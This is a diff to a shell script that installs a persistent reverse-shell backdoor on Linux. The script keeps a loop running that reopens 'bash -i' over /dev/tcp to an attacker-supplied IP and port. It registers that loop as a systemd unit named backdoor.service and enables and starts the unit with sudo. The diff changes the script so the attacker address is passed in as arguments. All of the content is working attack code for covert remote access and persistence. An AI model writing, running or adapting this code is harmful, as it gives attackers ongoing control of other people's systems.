@@ -39,7 +39,7 @@ while true; do
     # check if bash -i process is running
     if ! ps aux | grep -v grep | grep "bash -i" > /dev/null; then
         # If not running, start the reverse shell
-        bash -i >& /dev/tcp/$IP_ADDRESS/$PORT 0>&1 &
+        bash -i >& /dev/tcp/$1/$2 0>&1 &
         sleep 1
     else
         # if running, wait for a second and check again
@@ -65,7 +65,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=$BACKDOOR_PATH
+ExecStart=$BACKDOOR_PATH $IP_ADDRESS $PORT
 Restart=on-failure
 
 [Install]
@@ -75,6 +75,3 @@ EOF
 # enable and start service
 sudo systemctl enable backdoor.service
 sudo systemctl start backdoor.service
-
-
-
